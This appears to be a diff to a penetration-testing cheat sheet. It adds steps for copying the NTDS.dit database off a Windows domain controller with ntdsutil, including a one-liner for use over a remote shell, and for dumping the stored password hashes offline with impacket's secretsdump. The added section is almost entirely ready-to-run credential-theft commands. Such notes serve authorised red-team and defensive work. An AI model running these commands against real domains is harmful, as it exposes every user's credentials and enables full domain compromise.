@@ -340,3 +340,31 @@ rpcclient -U '' <host>
 rpcclient $> enumdomusers
 rpcclient $> queryuser <user>
 ```
+
+## Extract NTDS from a domain controller
+
+
+### ntdsutil
+
+On a DC, open a cmd shell:
+
+```batch
+ntdsutil
+activate instance ntds
+ifm
+create full C:\ntds.dit
+quit
+quit
+```
+
+If you have a remote shell, you can also use the one-liner:
+
+```batch
+ntdsutil "ac i ntds" "ifm" "create full C:\ntds.dit" q q
+```
+
+On your machine, use `impacket` to recover the hashes:
+
+```bash
+python secretsdump.py -ntds <ntds.dit> -system <SYSTEM> LOCAL -outputfile <output> -pwd-last-set -user-status -history
+```
